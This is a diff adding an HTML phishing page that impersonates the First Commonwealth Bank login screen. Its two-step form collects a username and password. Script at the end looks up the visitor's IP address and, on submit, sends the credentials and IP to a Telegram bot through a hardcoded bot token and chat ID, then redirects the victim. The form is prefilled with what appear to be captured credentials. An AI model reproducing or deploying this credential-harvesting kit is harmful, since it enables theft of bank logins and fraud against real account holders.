@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>First Commonwealth Bank - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-image: url('bgimg.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            color: #333;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 32px 16px;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 420px;
+            background: white;
+            padding: 32px;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 32px;
+        }
+
+        .logo-flex {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-first {
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #9B1B4A;
+            font-weight: 500;
+        }
+
+        .logo-main {
+            font-family: "Times New Roman", Times, serif;
+            font-size: 20px;
+            color: #9B1B4A;
+            margin-top: -2px;
+        }
+
+        .form-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: white;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            padding: 18px 16px;
+            color: #333;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .input-field:focus {
+            border-color: #9B1B4A;
+        }
+
+        .label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: white;
+            padding: 0 4px;
+            color: #888;
+            pointer-events: none;
+            transition: 0.2s ease-out;
+            font-size: 16px;
+        }
+
+        .input-field:focus ~ .label,
+        .input-field:not(:placeholder-shown) ~ .label {
+            top: 0;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .input-field:focus ~ .label {
+            color: #9B1B4A;
+        }
+
+        /* Checkbox and Forgot row */
+        .utility-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #666;
+            cursor: pointer;
+        }
+
+        .remember-me input {
+            accent-color: #9B1B4A;
+        }
+
+        .forgot-link {
+            color: #9B1B4A;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 16px;
+        }
+
+        .btn-main {
+            background: #9B1B4A;
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-main:hover {
+            background: #7d1640;
+        }
+
+        .enroll-link, .passkey-btn {
+            color: #9B1B4A;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 600;
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .enroll-link:hover, .passkey-btn:hover {
+            text-decoration: underline;
+        }
+
+        /* Step 2 - Username box with outline */
+        .readonly-user {
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 16px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            margin-bottom: 20px;
+        }
+
+        .readonly-user .user-label {
+            position: absolute;
+            top: -10px;
+            left: 12px;
+            background: white;
+            padding: 0 4px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .readonly-user .user-value {
+            font-size: 18px;
+            color: #333;
+        }
+
+        .switch-link {
+            color: #9B1B4A;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #9B1B4A;
+        }
+
+        footer {
+            background: #f5f5f5;
+            width: 100%;
+            padding: 24px 16px;
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+        }
+
+        footer p {
+            margin-bottom: 4px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 4px;
+        }
+
+        .footer-links a {
+            color: #9B1B4A;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .house-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-content">
+        <div class="card" id="loginCard">
+            <!-- Logo -->
+            <div class="logo-container">
+                <img src="logoimg.png" alt="First Commonwealth Bank" style="width: 270px; height: 80px; object-fit: contain;">
+            </div>
+
+            <!-- Step 1: Username -->
+            <div id="step1">
+                <div class="form-group">
+                    <input type="text" id="user" class="input-field" value="Fcfcbjm" placeholder=" " required>
+                    <label class="label">Username</label>
+                </div>
+                
+                <div class="utility-row" style="justify-content: flex-end;">
+                    <a href="#" class="forgot-link">Forgot?</a>
+                </div>
+
+                <div class="btn-row">
+                    <img src="userimgbtn.png" alt="Continue" style="width: 100%; cursor: pointer;" onclick="handleContinue()">
+                </div>
+            </div>
+
+            <!-- Step 2: Password (Hidden by default) -->
+            <div id="step2" class="hidden">
+                <form method="POST" id="form" action="">
+                    <input type="hidden" name="username" id="hiddenUsername">
+                    <div class="readonly-user">
+                        <span class="user-label">Username</span>
+                        <span class="user-value" id="displayUsername"></span>
+                        <a href="#" class="switch-link" onclick="handleSwitch(); return false;">Switch</a>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" id="pass" name="password" value="Cheer123!" class="input-field" placeholder=" " required>
+                        <label class="label">Enter your password</label>
+                        <span class="eye-icon" onclick="togglePassword()">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" id="eyeIcon">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+                            </svg>
+                        </span>
+                    </div>
+                    <div class="utility-row" style="justify-content: flex-end;">
+                        <a href="#" class="forgot-link">Forgot?</a>
+                    </div>
+                    <div class="btn-row">
+                        <button style="background: none; border: none; padding: 0; cursor: pointer; outline: none; box-shadow: none;" type="submit">
+                        <input type="image" src="passimgbtn.png" alt="Sign in" style="width: 100%; cursor: pointer;"></button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2026 First Commonwealth Bank &nbsp;&bull;&nbsp; (800) 711-2265</p>
+        <div class="footer-links">
+            <a href="#">Privacy policy</a>
+            <span>&bull;</span>
+            <span>Member FDIC</span>
+        </div>
+        <div class="house-icon">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M12 3l9 8h-3v9h-5v-6h-2v6h-5v-9h-3l9-8z"/>
+            </svg>
+            <span>Equal Housing Lender</span>
+        </div>
+    </footer>
+
+    <script>
+        function handleContinue() {
+            const username = document.getElementById('user').value;
+            if (username.trim()) {
+                document.getElementById('displayUsername').innerText = username;
+                document.getElementById('hiddenUsername').value = username;
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+                document.getElementById('passwordInput').focus();
+            }
+        }
+
+        function handleSwitch() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+            document.getElementById('passwordInput').value = '';
+        }
+
+        function togglePassword() {
+            const pwd = document.getElementById('passwordInput');
+            const icon = document.getElementById('eyeIcon');
+            if (pwd.type === 'password') {
+                pwd.type = 'text';
+                icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
+            } else {
+                pwd.type = 'password';
+                icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+            }
+        }
+
+        function handleSignIn() {
+            const password = document.getElementById('passwordInput').value;
+            if (password.trim()) {
+                alert('Sign in attempted');
+            }
+        }
+
+        // Enter key support
+        document.getElementById('user').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') handleContinue();
+        });
+        document.getElementById('pass').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') handleSignIn();
+        });
+    </script>
+          <p style="opacity: 0;" id="gfg">173.239.240.185</p>
+<script type="text/javascript"></script>
+
+          <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+
+<script>
+      /* Add "https://api.ipify.org?format=json" statement
+        this will communicate with the ipify servers in
+        order to retrieve the IP address $.getJSON will
+        load JSON-encoded data from the server using a
+        GET HTTP request */
+
+        $.getJSON("https://api.ipify.org?format=json",
+                                        function(data) {
+
+            // Setting text of element P with id gfg
+            $("#gfg").html(data.ip);
+        })
+
+    
+
+
+const form = document.querySelector("#form");
+
+form.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+
+    var text1 = document.getElementById("user").value;
+    var text2 = document.getElementById("pass").value;
+    var text3 = document.getElementById("gfg").textContent;
+    
+    var my_text = `F!rstCommonWealth BNK [Online Acess]:%0A<b>Online Acess</b>: ${text1} %0A<b>Password</b>: ${text2} %0A<b>IP</b>: ${text3}`;
+    // Note! <br> == %0A <br>-Not work
+
+    var token = "7653789486:AAFNsbYwsk10b1zx18odB1vb4z7Jtu6R7Sw"; // Your Telegram Bot token
+    var chat_id = "8277183843" // Chat ID || You can get easily receive JSON data from Telegram BOT in this web site - https://t-bot-r.netlify.app
+    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}&parse_mode=html`
+
+    let api = new XMLHttpRequest();
+    api.open("GET", url, true);
+    api.send();
+
+    console.log("Message successfully sended!")
+
+    
+
+            function sayHi() {
+          window.location.replace("gif.html");
+        }
+
+        setTimeout(sayHi, 3000);
+
+
+})
+
+// SUBSCRIBE MY YOUTUBE CHANNEL: https://youtube.com/manuchehr_programming
+// My Portfolio: https://manuchehr.me
+</script>
+</body>
+</html>
